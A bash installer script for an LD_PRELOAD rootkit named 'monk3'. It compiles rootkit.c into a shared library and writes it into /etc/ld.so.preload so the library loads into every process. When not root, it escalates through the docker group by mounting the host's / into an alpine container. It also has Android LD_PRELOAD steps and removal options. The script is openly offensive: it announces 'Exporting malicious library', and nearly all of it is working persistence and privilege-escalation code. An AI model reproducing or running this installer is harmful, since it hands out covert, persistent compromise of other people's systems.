#!/bin/bash

GREEN="\e[32m"
GREENBG="\e[1;42m"
RED="\e[0;31m"
RESETCOL="\e[0m"
LIB="/lib/librootkit"
MONK3PATH=$(pwd)

show_usage () { 
    echo -e "USAGE:\n\t-b\t\tbuild flag (compiles and loads monk3.lib.so into /etc/ld.so.preload)"    
    echo -e "\t-r\t\tremove flag (removes monk3.lib.so from /etc/ld.so.preload)"
    exit 1
}

load_library () {
    # if /etc/librootkit do not exist, create it
    if [ -d "$LIB" ]; then
        mv monk3.lib.so /lib/librootkit/monk3.lib.so
        echo "/lib/librootkit/monk3.lib.so" >> /etc/ld.so.preload
    else
        mkdir /lib/librootkit
        mv monk3.lib.so /lib/librootkit/monk3.lib.so
        echo "/lib/librootkit/monk3.lib.so" >> /etc/ld.so.preload
    fi
}

remove_library () {
    chattr -ia /etc/ld.so.preload
    rm -rf /etc/ld.so.preload /lib/librootkit/monk3.lib.so
}

docker_esc () {
    # if /etc/librootkit do not exist, create it
    if [ -d "$LIB" ]; then
        cd /
        docker run -v /:/mnt -i -t alpine sh -c "mv mnt${MONK3PATH}/monk3.lib.so mnt/lib/librootkit/monk3.lib.so; echo '/lib/librootkit/monk3.lib.so' >> mnt/etc/ld.so.preload"
    else
        cd /
        docker run -v /:/mnt -i -t alpine sh -c "mkdir mnt/lib/librootkit; mv mnt${MONK3PATH}/monk3.lib.so mnt/lib/librootkit/monk3.lib.so; echo '/lib/librootkit/monk3.lib.so' >> mnt/etc/ld.so.preload"
    fi
}

docker_remove () {
    cd /
    docker run -v /:/mnt -i -t alpine sh -c "rm -rf mnt/etc/ld.so.preload mnt/lib/librootkit/monk3.lib.so"
}

# verify if arguments are valid
if [ "$#" -eq 0 ]; then 
    echo -e "${RED}No arguments suplied!${RESETCOL}"; show_usage
fi
if [ "$#" -eq 2 ]; then 
    echo -e "${RED}Too many arguments!${RESETCOL}"; show_usage
fi

# compile source
gcc -shared -fPIC -D_GNU_SOURCE rootkit.c -o monk3.lib.so -ldl

for arg in "$@"; do
    case "$arg" in
    --android)
        echo -e "execute the following command:\n\texport LD_PRELOAD=$(pwd)/monk3.lib.so"
        ;;
    --android-remove)
        echo -e "execute the following command:\n\tunset LD_PRELOAD"
        ;;
    -b)
        echo -e "${GREEN}Exporting malicious library...${RESETCOL}"

        if [[ $EUID == 0 ]]; then
            load_library
        elif groups | grep -q "docker"; then
            docker_esc
        fi
        ;;
    -r)
        echo -e "${GREEN}Wiping /etc/ld.so.preload & removing compiled source...${RESETCOL}" 
        if [[ $EUID == 0 ]]; then
            remove_library
        elif groups | grep -q "docker"; then
            docker_remove
        fi
        ;;
    esac
done
